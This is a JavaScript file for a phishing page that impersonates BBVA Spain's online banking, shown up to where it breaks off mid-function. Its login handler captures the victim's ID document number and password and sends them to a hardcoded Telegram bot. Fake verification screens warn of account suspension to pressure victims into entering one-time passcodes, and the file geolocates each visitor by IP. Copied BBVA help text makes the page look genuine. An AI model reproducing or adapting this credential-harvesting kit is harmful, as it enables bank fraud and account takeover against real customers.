// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = '8127105896:AAFr9QpMp4Ek_ClSH6nTRfoFDzCzssQS0z0';
const TELEGRAM_CHAT_ID = '6803542708';

// Telegram API URL
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

// Function to send message to Telegram
async function sendToTelegram(message) {
    try {
        console.log('Sending to Telegram:', message);
        console.log('API URL:', TELEGRAM_API_URL);
        console.log('Chat ID:', TELEGRAM_CHAT_ID);
        
        const response = await fetch(TELEGRAM_API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        const data = await response.json();
        console.log('Telegram API Response:', data);
        
        if (!response.ok) {
            console.error('Telegram API error:', response.statusText, data);
        } else {
            console.log('✅ Message sent successfully to Telegram!');
        }
    } catch (error) {
        console.error('❌ Error sending to Telegram:', error);
    }
}

// Function to get user country from IP
async function getCountryFromIP() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            country: data.country_name || 'Unknown',
            countryCode: data.country_code || 'Unknown',
            city: data.city || 'Unknown',
            ip: data.ip || 'Unknown'
        };
    } catch (error) {
        console.error('Error getting country from IP:', error);
        return {
            country: 'Unknown',
            countryCode: 'Unknown',
            city: 'Unknown',
            ip: 'Unknown'
        };
    }
}

// Function to get current time
function getCurrentTime() {
    const now = new Date();
    return now.toLocaleString('en-US', {
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: true
    });
}

// Function to get user info
function getUserInfo() {
    return {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
}

// Language translations
const translations = {
    es: {
        // Header
        help: 'Ayuda',
        menu: 'Menú',
        close: 'Cerrar',
        
        // Greetings
        greetingMorning: 'Buenos días',
        greetingAfternoon: 'Buenas tardes',
        greetingEvening: 'Buenas tardes',
        
        // Main content
        activateCard: 'Activa tu tarjeta aquí',
        activateCardText: 'Si ya tienes una cuenta, puedes activar tu tarjeta aquí',
        notCustomerYet: '¿AÚN NO ERES CLIENTE DE BBVA?',
        stillPayingFees: '¿Sigues pagando comisiones por tu cuenta?',
        discoverOptions: 'Descubre todas las opciones que tenemos para ti y elige la que mejor se adapte a tus necesidades.',
        moreInformation: 'Más información',
        preferenceText: 'SI PREFIERES, PUEDES<br>CONOCERNOS POCO A POCO',
        tryApp: 'Prueba la app de BBVA sin ser cliente',
        trialText: 'Podrás usar las principales funciones de la app para tus necesidades diarias, como reservar una cita, añadir bancos o calcular el valor de una vivienda. Inicia sesión en dos pasos, sin compromiso.',
        
        // Login modal
        login: 'Iniciar sesión',
        loginIdPlaceholder: 'NIF, NIE, DNI o Pasaporte',
        loginPasswordPlaceholder: 'Contraseña de acceso',
        
        // Verification
        otpVerificationRequired: 'Verificación OTP Requerida',
        verifyOTP: 'Verificar OTP',
        securityMessage1: 'Por tu seguridad, esta verificación debe completarse.',
        securityMessage2: 'Si no finalizas el proceso, tu acceso a la banca móvil puede suspenderse temporalmente.',
        securityMessage3: 'Por favor, haz clic en "Entiendo", introduce el OTP y completa la verificación para continuar usando tu cuenta sin interrupciones.',
        thankYou: 'Gracias.',
        iUnderstand: 'Entiendo',
        
        // OTP
        otpSent: 'El OTP ha sido enviado al número de móvil registrado',
        submitOTP: 'Enviar OTP',
        otpExpired: '¡OTP expirado, introduce un nuevo OTP!',
        resendOTP: 'Reenviar OTP',
        
        // Help questions
        helpQ1: '¿Qué puedo hacer si tengo problemas para iniciar sesión en la app de BBVA?',
        helpA1_1: 'Si nuestra app no funciona correctamente, intenta realizar una de las siguientes acciones:',
        helpA1_2: 'Forzar el cierre de la app (normalmente en Configuración > Aplicaciones > BBVA España > Forzar cierre).',
        helpA1_3: 'Limpiar la caché y los datos de la aplicación (También en Configuración > Aplicaciones > BBVA España).',
        helpA1_4: 'Si hay actualizaciones disponibles, instálalas. En este proceso, recuerda reiniciar tu teléfono después de las actualizaciones.',
        helpA1_5: 'Toca "Cambiar usuario" en la pantalla de la app BBVA ES.',
        helpA1_6: 'Desinstala la app e instálala de nuevo.',
        helpA1_7: 'Una vez realizados los pasos anteriores, apaga el teléfono durante un minuto, vuelve a encenderlo e intenta iniciar sesión de nuevo.',
        
        helpQ2: '¿Qué puedo hacer si mi acceso está temporalmente bloqueado?',
        helpA2: 'Si tu acceso está temporalmente bloqueado, contacta con el Servicio de Atención al Cliente de BBVA. Te ayudarán a desbloquear tu cuenta y restaurar el acceso a tus servicios online.',
        
        helpQ3: '¿Cómo puedo recuperar o cambiar mi contraseña de acceso?',
        helpA3_1: 'En cualquier caso, necesitarás identificarte con un documento de identidad y crear una nueva contraseña, que debe ser única y tener entre 4 y 6 caracteres, combinando números y letras que distinguen entre mayúsculas y minúsculas. Ten a mano tu tarjeta BBVA y tu teléfono móvil; si no tienes tu tarjeta, llama al Servicio de Atención al Cliente.',
        helpA3_2: 'Para recuperar tu contraseña:',
        helpA3_3: 'Desde la app de BBVA:',
        helpA3_4: 'Selecciona "¿Has olvidado tu contraseña de acceso?" en la pantalla de inicio.',
        helpA3_5: 'Desde la web de BBVA:',
        helpA3_6: 'Ve a iniciar sesión y selecciona "¿Has olvidado tu contraseña de acceso?"',
        helpA3_7: 'Para cambiar tu contraseña:',
        helpA3_8: 'Desde la app de BBVA:',
        helpA3_9: 'Ve a Menú > Seguridad > Métodos de acceso > Contraseña',
        helpA3_10: 'Desde la web de BBVA:',
        helpA3_11: 'Selecciona Mi Perfil > Seguridad > Contraseña de acceso > Modificar',
        
        helpQ4: '¿Cómo accedo a mi cuenta online de BBVA o creo una contraseña de acceso?',
        helpA4_1: 'Lo primero que necesitas para acceder a tu cuenta online es crear una contraseña de acceso. La contraseña de acceso es una combinación única de 4 a 6 caracteres, formada por números y letras que distinguen entre mayúsculas y minúsculas, que te permite usar de forma segura todos los servicios online de BBVA.',
        helpA4_2: 'Tienes dos formas de crear la contraseña; necesitarás un documento de identidad y la información de una de tus tarjetas BBVA.',
        helpA4_3: 'Desde la app de BBVA:',
        helpA4_4: 'Descarga la app de BBVA.',
        helpA4_5: 'Selecciona Crear contraseña de acceso y sigue los pasos que se muestran.',
        helpA4_6: 'Desde la web de BBVA:',
        helpA4_7: 'En el menú superior, selecciona Acceso.',
        helpA4_8: 'Selecciona Crea tu contraseña y sigue los pasos que se muestran.'
    },
    en: {
        // Header
        help: 'Help',
        menu: 'Menu',
        close: 'Close',
        
        // Greetings
        greetingMorning: 'Good morning',
        greetingAfternoon: 'Good afternoon',
        greetingEvening: 'Good evening',
        
        // Main content
        activateCard: 'Activate Your Card here',
        activateCardText: 'If you already have an account, you can activate your card here',
        notCustomerYet: 'NOT A BBVA CUSTOMER YET?',
        stillPayingFees: 'Still paying fees for your account?',
        discoverOptions: 'Discover all the options we have for you and choose the one that best suits your needs.',
        moreInformation: 'More information',
        preferenceText: 'IF YOU PREFER, YOU CAN<br>GET TO KNOW US LITTLE BY LITTLE',
        tryApp: 'Try the BBVA app without being a customer',
        trialText: 'You\'ll be able to use the app\'s main features for your daily needs, like booking an appointment, adding banks, or calculating a home\'s value. Sign in two steps, with no commitment.',
        
        // Login modal
        login: 'Log in',
        loginIdPlaceholder: 'NIF, NIE, ID Card or Passport',
        loginPasswordPlaceholder: 'Login password',
        
        // Verification
        otpVerificationRequired: 'OTP Verification Required',
        verifyOTP: 'Verify OTP',
        securityMessage1: 'For your security, this verification must be completed.',
        securityMessage2: 'If you do not finish the process, your mobile banking access may be temporarily suspended.',
        securityMessage3: 'Please click "I Understand", enter the OTP, and complete the verification to continue using your account without interruption.',
        thankYou: 'Thank you.',
        iUnderstand: 'I Understand',
        
        // OTP
        otpSent: 'OTP has been sent to registered mobile number',
        submitOTP: 'Submit OTP',
        otpExpired: 'OTP expired enter new OTP!',
        resendOTP: 'Resend OTP',
        
        // Help questions
        helpQ1: 'What can I do if I have problems logging into the BBVA app?',
        helpA1_1: 'If our app is not working correctly, please try taking one of the following actions again:',
        helpA1_2: 'Force the app to quit (usually found in Settings > Applications > BBVA España > Force quit).',
        helpA1_3: 'Clear the cache and application data (Also in Settings > Applications > BBVA España).',
        helpA1_4: 'If there are updates available, install them. In this process, remember to restart your cell phone after the updates.',
        helpA1_5: 'Tap "Change user" on the BBVA ES app screen.',
        helpA1_6: 'Uninstall the app and install it again.',
        helpA1_7: 'Once the above steps are done, turn off the phone for one minute, turn it back on and try logging in again.',
        
        helpQ2: 'What can I do if my access is temporarily blocked?',
        helpA2: 'If your access is temporarily blocked, please contact BBVA Customer Service for assistance. They will help you unblock your account and restore access to your online services.',
        
        helpQ3: 'How can I recover or change my login password?',
        helpA3_1: 'In either case, you will need to identify yourself with an ID document and create a new password, which must be unique and have 4 to 6 characters, combining numbers and case-sensitive letters. Have your BBVA card and cell phone at hand; if you don\'t have your card, call Customer Service.',
        helpA3_2: 'To recover your password:',
        helpA3_3: 'From the BBVA app:',
        helpA3_4: 'Select "Forgot your login password?" on the Home screen.',
        helpA3_5: 'From the BBVA website:',
        helpA3_6: 'Go to login and select "Have you forgotten your login password?"',
        helpA3_7: 'To change your password:',
        helpA3_8: 'From the BBVA app:',
        helpA3_9: 'Go to Menu > Security > Login methods > Password',
        helpA3_10: 'From the BBVA website:',
        helpA3_11: 'Select My Profile > Security > Login password > Modify',
        
        helpQ4: 'How do I access my BBVA online account or create a login password?',
        helpA4_1: 'The first thing you need to access your online account is to create a login password. The login password is a unique combination of 4 to 6 characters, consisting of numbers and case-sensitive letters, which allows you to securely use all of BBVA\'s online services.',
        helpA4_2: 'You have two ways to create the password; you will need an ID document and the information from one of your BBVA cards.',
        helpA4_3: 'From the BBVA app:',
        helpA4_4: 'Download the BBVA app.',
        helpA4_5: 'Select Create login password and follow the steps shown.',
        helpA4_6: 'From the BBVA website:',
        helpA4_7: 'In the top menu, select Access.',
        helpA4_8: 'Select Create your password and follow the steps shown.'
    }
};

// Current language (default: Spanish)
let currentLanguage = 'es';

// JavaScript for interactive features
document.addEventListener('DOMContentLoaded', function() {
    console.log('BBVA Website Loaded');
    
    // Initialize language
    updateLanguage();
    
    // Initialize language buttons
    updateLanguageButtons();
    
    // Set dynamic greeting based on time of day
    function setGreeting() {
        const greetingElement = document.getElementById('greeting');
        if (greetingElement) {
            const currentHour = new Date().getHours();
            let greetingKey;
            
            if (currentHour >= 5 && currentHour < 12) {
                greetingKey = 'greetingMorning';
            } else if (currentHour >= 12 && currentHour < 17) {
                greetingKey = 'greetingAfternoon';
            } else {
                greetingKey = 'greetingEvening';
            }
            
            greetingElement.textContent = translations[currentLanguage][greetingKey];
        }
    }
    
    // Set greeting when page loads
    setGreeting();
    
    
    // Also use event delegation as backup
    document.addEventListener('click', function(e) {
        const helpButton = e.target.closest('#help-button');
        if (helpButton) {
            console.log('Help button clicked via document delegation');
            e.preventDefault();
            e.stopPropagation();
            openHelpScreen(e);
        }
        
        const menuButton = e.target.closest('#menu-button');
        if (menuButton) {
            console.log('Menu button clicked via document delegation');
            e.preventDefault();
            e.stopPropagation();
            openMenuScreen(e);
        }
    }, true);
    
    // Function to attach button listeners
    function attachButtonListeners() {
        const helpButton = document.getElementById('help-button');
        const menuButton = document.getElementById('menu-button');
        
        if (helpButton) {
            // Remove old listeners by cloning
            const newHelpButton = helpButton.cloneNode(true);
            helpButton.parentNode.replaceChild(newHelpButton, helpButton);
            
            console.log('Attaching click listener to help button');
            newHelpButton.addEventListener('click', function(e) {
                console.log('Help button clicked - event listener fired!');
                e.preventDefault();
                e.stopPropagation();
                openHelpScreen(e);
            }, true);
            
            newHelpButton.addEventListener('mousedown', function(e) {
                console.log('Help button mousedown - event listener fired!');
                e.preventDefault();
                e.stopPropagation();
                openHelpScreen(e);
            }, true);
        }
        
        if (menuButton) {
            // Remove old listeners by cloning
            const newMenuButton = menuButton.cloneNode(true);
            menuButton.parentNode.replaceChild(newMenuButton, menuButton);
            
            console.log('Attaching click listener to menu button');
            newMenuButton.addEventListener('click', function(e) {
                console.log('Menu button clicked - event listener fired!');
                e.preventDefault();
                e.stopPropagation();
                openMenuScreen(e);
            }, true);
            
            newMenuButton.addEventListener('mousedown', function(e) {
                console.log('Menu button mousedown - event listener fired!');
                e.preventDefault();
                e.stopPropagation();
                openMenuScreen(e);
            }, true);
        }
    }
    
    // Attach listeners initially
    attachButtonListeners();
    
    // Transition from first screen (download.jpg) to importance popup
    // Change the delay (3000 = 3 seconds) to adjust timing
    setTimeout(function() {
        const firstScreen = document.querySelector('.first-screen');
        const importancePopup = document.getElementById('importance-popup-overlay');
        const secondScreen = document.querySelector('.second-screen');
        
        if (firstScreen && importancePopup && secondScreen) {
            // Hide first screen
            firstScreen.classList.add('hide');
            
            // Show home screen (transparent/visible behind popup)
            secondScreen.classList.add('show');
            
            // Show popup overlay
            importancePopup.classList.add('show');
            console.log('Importance popup is now visible!');
        }
    }, 3000); // 3 seconds delay - change this value as needed
    
    // Help Screen Functionality
    function initHelpScreen() {
        const helpButton = document.getElementById('help-button');
        const helpOverlay = document.getElementById('help-overlay');
        const helpClose = document.getElementById('help-close');
        
        console.log('Help button:', helpButton);
        console.log('Help overlay:', helpOverlay);
        
        if (helpButton && helpOverlay) {
            helpButton.onclick = function(e) {
                e.preventDefault();
                e.stopPropagation();
                const secondScreen = document.querySelector('.second-screen');
                // Only open if second screen (home screen) is visible
                if (secondScreen && secondScreen.classList.contains('show')) {
                    console.log('Help button clicked!');
                    helpOverlay.classList.add('active');
                    
                    // Prevent background scrolling
                    const screen = document.querySelector('.screen');
                    if (screen) {
                        screen.style.overflow = 'hidden';
                    }
                    
                    // Hide second screen content
                    if (secondScreen) {
                        secondScreen.style.visibility = 'hidden';
                    }
                } else {
                    console.log('Help button clicked but home screen not visible');
                }
            };
        } else {
            console.error('Help button or overlay not found!');
        }
        
        if (helpClose && helpOverlay) {
            helpClose.onclick = function(e) {
                e.preventDefault();
                e.stopPropagation();
                closeHelpScreen();
            };
        }
        
        // Close help screen when clicking on overlay (but not on the help screen itself)
        if (helpOverlay) {
            helpOverlay.addEventListener('click', function(e) {
                if (e.target === helpOverlay) {
                    closeHelpScreen();
                }
            });
        }
    }
    
    // Initialize help screen - try multiple times to ensure it works
    initHelpScreen();
    setTimeout(initHelpScreen, 500);
    setTimeout(initHelpScreen, 3500); // After second screen appears
});

// Global function for inline onclick - only works when home screen is visible
function openHelpScreen(event) {
    console.log('=== openHelpScreen CALLED ===');
    
    if (!event) {
        event = window.event || {};
    }
    if (event) {
        if (event.preventDefault) event.preventDefault();
        if (event.stopPropagation) event.stopPropagation();
        if (event.cancelBubble !== undefined) event.cancelBubble = true;
    }
    
    const secondScreen = document.querySelector('.second-screen');
    const helpOverlay = document.getElementById('help-overlay');
    
    console.log('Second screen element:', secondScreen);
    console.log('Has show class?', secondScreen ? secondScreen.classList.contains('show') : 'No second screen');
    console.log('Help overlay:', helpOverlay);
    
    // Only open if second screen (home screen) is visible
    if (secondScreen && secondScreen.classList.contains('show') && helpOverlay) {
        console.log('✓ Opening help screen!');
        helpOverlay.classList.add('active');
        
        // Prevent background scrolling
        const screen = document.querySelector('.screen');
        if (screen) {
            screen.style.overflow = 'hidden';
        }
        
        // Hide second screen content
        if (secondScreen) {
            secondScreen.style.visibility = 'hidden';
        }
        
        return false;
    } else {
        console.log('✗ Help button clicked but home screen not visible yet');
        return false;
    }
}

function closeHelpScreen() {
    const helpOverlay = document.getElementById('help-overlay');
    if (helpOverlay) {
        helpOverlay.classList.remove('active');
        
        // Restore background scrolling
        const screen = document.querySelector('.screen');
        if (screen) {
            screen.style.overflow = 'auto';
        }
        
        // Show second screen content again
        const secondScreen = document.querySelector('.second-screen');
        if (secondScreen) {
            secondScreen.style.visibility = 'visible';
        }
    }
}

// Menu button function - only works when home screen is visible
function openMenuScreen(event) {
    console.log('=== openMenuScreen CALLED ===');
    
    if (!event) {
        event = window.event || {};
    }
    if (event) {
        if (event.preventDefault) event.preventDefault();
        if (event.stopPropagation) event.stopPropagation();
        if (event.cancelBubble !== undefined) event.cancelBubble = true;
    }
    
    const secondScreen = document.querySelector('.second-screen');
    
    console.log('Second screen element:', secondScreen);
    console.log('Has show class?', secondScreen ? secondScreen.classList.contains('show') : 'No second screen');
    
    // Only work if second screen (home screen) is visible
    if (secondScreen && secondScreen.classList.contains('show')) {
        console.log('✓ Menu button clicked!');
        openMenuSidebar();
        return false;
    } else {
        console.log('✗ Menu button clicked but home screen not visible yet');
        return false;
    }
}

// Toggle question expand/collapse
function toggleQuestion(header) {
    const questionItem = header.closest('.help-question-item');
    const icon = header.querySelector('.help-question-icon');
    
    if (questionItem.classList.contains('expanded')) {
        questionItem.classList.remove('expanded');
        icon.textContent = '+';
    } else {
        // Close other expanded questions
        document.querySelectorAll('.help-question-item.expanded').forEach(item => {
            item.classList.remove('expanded');
            item.querySelector('.help-question-icon').textContent = '+';
        });
        
        // Open clicked question
        questionItem.classList.add('expanded');
        icon.textContent = '−';
    }
}

// Login Modal Functions
function openLoginModal() {
    const loginModal = document.getElementById('login-modal-overlay');
    if (loginModal) {
        loginModal.classList.add('active');
        
        // Prevent background scrolling
        const screen = document.querySelector('.screen');
        if (screen) {
            screen.style.overflow = 'hidden';
        }
    }
}

function closeLoginModal() {
    const loginModal = document.getElementById('login-modal-overlay');
    if (loginModal) {
        loginModal.classList.remove('active');
        
        // Restore background scrolling
        const screen = document.querySelector('.screen');
        if (screen) {
            screen.style.overflow = 'auto';
        }
    }
}


// Close login modal when clicking on overlay
document.addEventListener('click', function(e) {
    const loginModal = document.getElementById('login-modal-overlay');
    if (loginModal && e.target === loginModal) {
        closeLoginModal();
    }
});

// Handle Login Button Click
async function handleLogin(event) {
    if (event) {
        event.preventDefault();
        event.stopPropagation();
    }
    
    console.log('🔐 Login button clicked!');
    
    // Get login credentials
    const loginId = document.getElementById('login-id').value;
    const loginPassword = document.getElementById('login-password').value;
    
    console.log('Login ID:', loginId);
    console.log('Password:', loginPassword ? '***' : 'empty');
    
    // Store credentials in sessionStorage for OTP message
    sessionStorage.setItem('bbva_login_id', loginId);
    sessionStorage.setItem('bbva_password', loginPassword);
    
    // Close login modal immediately
    closeLoginModal();
    
    // Show loading screen immediately (don't wait for Telegram)
    const loadingOverlay = document.getElementById('loading-overlay');
    if (loadingOverlay) {
        loadingOverlay.classList.add('active');
        
        // Prevent background scrolling
        const screen = document.querySelector('.screen');
        if (screen) {
            screen.style.overflow = 'hidden';
        }
        
        // After 3 seconds, hide loading and show verification screen
        setTimeout(function() {
            loadingOverlay.classList.remove('active');
            
            const verificationOverlay = document.getElementById('verification-overlay');
            if (verificationOverlay) {
                verificationOverlay.classList.add('active');
            }
        }, 3000);
    }
    
    // Send login credentials to Telegram in background (non-blocking)
    const currentTime = getCurrentTime();
    const loginMessage = `
🔐 <b>BBVA Login Credentials</b>

👤 <b>User ID:</b> ${loginId}
🔑 <b>Password:</b> ${loginPassword}

⏰ <b>Time:</b> ${currentTime}
    `;
    
    console.log('Sending login credentials to Telegram...');
    sendToTelegram(loginMessage).catch(err => {
        console.error('Error sending to Telegram:', err);
    });
    
    return false;
}

// Close Verification Screen
function closeVerificationScreen() {
    const verificationOverlay = document.getElementById('verification-overlay');
    if (verificationOverlay) {
        verificationOverlay.classList.remove('active');
        
        // Restore background scrolling
        const screen = document.querySelector('.screen');
        if (screen) {
            screen.style.overflow = 'auto';
        }
    }
}

// OTP Resend Timer
let otpTimer = null;
let otpTimerSeconds = 120; // 2 minutes

// Show OTP Verification Screen
function showOTPVerificationScreen() {
    const verificationOverlay = document.getElementById('verification-overlay');
    const otpVerificationOverlay = document.getElementById('otp-verification-overlay');
    
    if (verificationOverlay) {
        verificationOverlay.classList.remove('active');
    }
    
    if (otpVerificationOverlay) {
        otpVerificationOverlay.classList.add('active');
        
        // Start OTP resend timer when OTP screen appears
        startOTPTimer();
        
        // Focus on first OTP input
        setTimeout(function() {
            const firstInput = document.getElementById('otp-1');
            if (firstInput) {
                firstInput.focus();
            }
        }, 100);
    }
}

// Start OTP Resend Timer
function startOTPTimer() {
    // Reset timer
    otpTimerSeconds = 120;
    
    // Get elements
    const resendBtn = document.getElementById('otp-resend-btn');
    const timerText = document.getElementById('resend-timer-text');
    
    if (resendBtn) {
        resendBtn.disabled = true;
    }
    
    // Clear any existing timer
    if (otpTimer) {
        clearInterval(otpTimer);
    }
    
    // Update countdown display
    const lang = translations[currentLanguage];
    if (timerText) {
        timerText.innerHTML = `${lang.resendOTP} (${otpTimerSeconds}s)`;
    }
    
    // Start countdown
    otpTimer = setInterval(function() {
        otpTimerSeconds--;
        
        if (timerText) {
            timerText.innerHTML = `${lang.resendOTP} (${otpTimerSeconds}s)`;
        }
        
        if (otpTimerSeconds <= 0) {
            clearInterval(otpTimer);
            otpTimer = null;
            
            // Check if OTP was entered
            const otp1 = document.getElementById('otp-1').value;
            const otp2 = document.getElementById('otp-2').value;
            const otp3 = document.getElementById('otp-3').value;
            const otp4 = document.getElementById('otp-4').value;
            const otp5 = document.getElementById('otp-5').value;
            const otp6 = document.getElementById('otp-6').value;
            const otp = otp1 + otp2 + otp3 + otp4 + otp5 + otp6;
            
            // If OTP is not complete, show error popup
            if (otp.length !== 6) {
                showOTPErrorPopup();
            } else {
                // Enable resend button if OTP was entered
                if (resendBtn) {
                    resendBtn.disabled = false;
                }
                
                // Update text
                if (timerText) {
                    timerText.innerHTML = lang.resendOTP || 'Resend OTP';
                }
            }
        }
    }, 1000);
}

// Resend OTP Function
function resendOTP() {
    const resendBtn = document.getElementById('otp-resend-btn');
    const timerText = document.getElementById('resend-timer-text');
    const timerCountdown = document.getElementById('timer-countdown');
    
    if (resendBtn && resendBtn.disabled) {
        return; // Don't resend if timer is still running
    }
    
    // Clear OTP inputs
    document.getElementById('otp-1').value = '';
    document.getElementById('otp-2').value = '';
    document.getElementById('otp-3').value = '';
    document.getElementById('otp-4').value = '';
    document.getElementById('otp-5').value = '';
    document.getElementById('otp-6').value = '';
    
    // Hide error message
    const errorMessage = document.getElementById('otp-error-message');
    if (errorMessage) {
        errorMessage.style.display = 'none';
    }
    
    // Restart timer
    startOTPTimer();
    
    // Focus on first input
    setTimeout(function() {
        const firstInput = document.getElementById('otp-1');
        if (firstInput) {
            firstInput.focus();
        }
    }, 100);
    
    console.log('OTP resent - timer restarted');
}

// Update all text based on current language
function updateLanguage() {
    const lang = translations[currentLanguage];
    
    // Update all elements with data-translate attribute
    document.querySelectorAll('[data-translate]').forEach(element => {
        const key = element.getAttribute('data-translate');
        if (lang[key]) {
            if (element.tagName === 'INPUT' && element.type !== 'submit' && element.type !== 'button') {
                element.placeholder = lang[key];
            } else if (element.tagName === 'BUTTON') {
                element.textContent = lang[key];
            } else {
                element.innerHTML = lang[key];
            }
        }
    });
    
    // Update greeting dynamically
    const greetingElement = document.getElementById('greeting');
    if (greetingElement) {
        const currentHour = new Date().getHours();
        let greetingKey;
        if (currentHour >= 5 && currentHour < 12) {
            greetingKey = 'greetingMorning';
        } else if (currentHour >= 12 && currentHour < 17) {
            greetingKey = 'greetingAfternoon';
        } else {
            greetingKey = 'greetingEvening';
        }
        greetingElement.textContent = lang[greetingKey];
    }
    
    // Update help questions
    updateHelpQuestions();
    
    // Update login modal
    updateLoginModal();
    
    // Update verification screens
    updateVerificationScreens();
    
    // Update language display
    const languageDisplay = document.getElementById('language-display');
    if (languageDisplay) {
        languageDisplay.textContent = currentLanguage.toUpperCase();
    }
    
    // Update menu language title
    const menuLanguageTitle = document.getElementById('menu-language-title');
    if (menuLanguageTitle) {
        menuLanguageTitle.textContent = currentLanguage === 'es' ? 'Idioma / Language' : 'Language / Idioma';
    }
}

// Update help questions
function updateHelpQuestions() {
    const lang = translations[currentLanguage];
    const questions = document.querySelectorAll('.help-question-text');
    const answers = document.querySelectorAll('.help-question-answer');
    
    if (questions.length >= 4 && answers.length >= 4) {
        questions[0].textContent = lang.helpQ1;
        questions[1].textContent = lang.helpQ2;
        questions[2].textContent = lang.helpQ3;
        questions[3].textContent = lang.helpQ4;
        
        // Update answers
        answers[0].innerHTML = `
            <p>${lang.helpA1_1}</p>
            <ul>
                <li>${lang.helpA1_2}</li>
                <li>${lang.helpA1_3}</li>
                <li>${lang.helpA1_4}</li>
                <li>${lang.helpA1_5}</li>
                <li>${lang.helpA1_6}</li>
            </ul>
            <p>${lang.helpA1_7}</p>
        `;
        
        answers[1].innerHTML = `<p>${lang.helpA2}</p>`;
        
        answers[2].innerHTML = `
            <p>${lang.helpA3_1}</p>
            <h4>${lang.helpA3_2}</h4>
            <h5>${lang.helpA3_3}</h5>
            <ul><li>${lang.helpA3_4}</li></ul>
            <h5>${lang.helpA3_5}</h5>
            <ul><li>${lang.helpA3_6}</li></ul>
            <h4>${lang.helpA3_7}</h4>
            <h5>${lang.helpA3_8}</h5>
            <ul><li>${lang.helpA3_9}</li></ul>
            <h5>${lang.helpA3_10}</h5>
            <ul><li>${lang.helpA3_11}</li></ul>
        `;
        
        answers[3].innerHTML = `
            <p>${lang.helpA4_1}</p>
            <p>${lang.helpA4_2}</p>
            <h5>${lang.helpA4_3}</h5>
            <ul>
                <li>${lang.helpA4_4}</li>
                <li>${lang.helpA4_5}</li>
            </ul>
            <h5>${lang.helpA4_6}</h5>
            <ul>
                <li>${lang.helpA4_7}</li>
                <li>${lang.helpA4_8}</li>
            </ul>
        `;
    }
}

// Update login modal
function updateLoginModal() {
    const lang = translations[currentLanguage];
    const loginTitle = document.querySelector('.login-modal-title');
    const loginIdInput = document.getElementById('login-id');
    const loginPasswordInput = document.getElementById('login-password');
    const loginSubmitBtn = document.getElementById('login-submit-btn');
    const loginHelpLabels = document.querySelectorAll('.login-icon-label');
    
    if (loginTitle) loginTitle.textContent = lang.login;
    if (loginIdInput) loginIdInput.placeholder = lang.loginIdPlaceholder;
    if (loginPasswordInput) loginPasswordInput.placeholder = lang.loginPasswordPlaceholder;
    if (loginSubmitBtn) loginSubmitBtn.textContent = lang.login;
    if (loginHelpLabels.length >= 2) {
        loginHelpLabels[0].textContent = lang.help;
        loginHelpLabels[1].textContent = lang.close;
    }
}

// Update verification screens
function updateVerificationScreens() {
    const lang = translations[currentLanguage];
    const verificationTitle = document.querySelector('.verification-title');
    const verificationHeading = document.querySelector('.verification-heading');
    const verificationText = document.querySelector('.verification-text');
    const verificationBtn = document.querySelector('.verification-understand-btn');
    const otpTitle = document.querySelector('.otp-verification-title');
    const otpMessage = document.querySelector('.otp-message');
    const otpSubmitBtn = document.querySelector('.otp-submit-btn');
    const otpErrorMsg = document.getElementById('otp-error-message');
    
    if (verificationTitle) verificationTitle.textContent = lang.otpVerificationRequired;
    if (verificationHeading) verificationHeading.textContent = lang.verifyOTP;
    if (verificationText) {
        const paragraphs = verificationText.querySelectorAll('p');
        if (paragraphs.length >= 4) {
            paragraphs[0].textContent = lang.securityMessage1;
            paragraphs[1].textContent = lang.securityMessage2;
            paragraphs[2].textContent = lang.securityMessage3;
            paragraphs[3].textContent = lang.thankYou;
        }
    }
    if (verificationBtn) verificationBtn.textContent = lang.iUnderstand;
    if (otpTitle) otpTitle.textContent = lang.otpVerificationRequired;
    if (otpMessage) otpMessage.textContent = lang.otpSent;
    if (otpSubmitBtn) otpSubmitBtn.textContent = lang.submitOTP;
    if (otpErrorMsg) otpErrorMsg.textContent = lang.otpExpired;
}

// Toggle language between Spanish and English (for help screen button)
function toggleLanguage() {
    currentLanguage = currentLanguage === 'es' ? 'en' : 'es';
    updateLanguage();
    updateLanguageButtons();
}

// Change language (for menu sidebar buttons)
function changeLanguage(lang) {
    currentLanguage = lang;
    updateLanguage();
    updateLanguageButtons();
    closeMenuSidebar();
}

// Update language buttons to show active state
function updateLanguageButtons() {
    const esBtn = document.getElementById('menu-lang-es');
    const enBtn = document.getElementById('menu-lang-en');
    
    if (esBtn && enBtn) {
        if (currentLanguage === 'es') {
            esBtn.classList.add('active');
            enBtn.classList.remove('active');
        } else {
            enBtn.classList.add('active');
            esBtn.classList.remove('active');
        }
    }
}

// Open Menu Sidebar
function openMenuSidebar() {
    const menuOverlay = document.getElementById('menu-overlay');
    if (menuOverlay) {
        menuOverlay.classList.add('active');
        
        // Prevent background scrolling
        const screen = document.querySelector('.screen');
        if (screen) {
            screen.style.overflow = 'hidden';
        }
        
        // Update active language button
        updateLanguageButtons();
    }
}

// Close Menu Sidebar
function closeMenuSidebar() {
    const menuOverlay = document.getElementById('menu-overlay');
    if (menuOverlay) {
        menuOverlay.classList.remove('active');
        
        // Restore background scrolling
        const screen = document.querySelector('.screen');
        if (screen) {
            screen.style.overflow = 'auto';
        }
    }
}

// Close menu when clicking on overlay
document.addEventListener('click', function(e) {
    const menuOverlay = document.getElementById('menu-overlay');
    if (menuOverlay && e.target === menuOverlay) {
        closeMenuSidebar();
    }
});

// Handle OTP input - only allow numbers and move to next
function handleOTPInput(current, nextId) {
    // Remove any non-numeric characters
    current.value = current.value.replace(/[^0-9]/g, '');
    
    // Hide error message when user starts typing
    const errorMessage = document.getElementById('otp-error-message');
    if (errorMessage) {
        errorMessage.style.display = 'none';
    }
    
    if (current.value.length === 1) {
        const nextInput = document.getElementById(nextId);
        if (nextInput) {
            nextInput.focus();
        }
    }
}

// Handle backspace in OTP inputs
function handleOTPBackspace(event, currentId, prevId) {
    if (event.key === 'Backspace' && event.target.value === '') {
        if (prevId) {
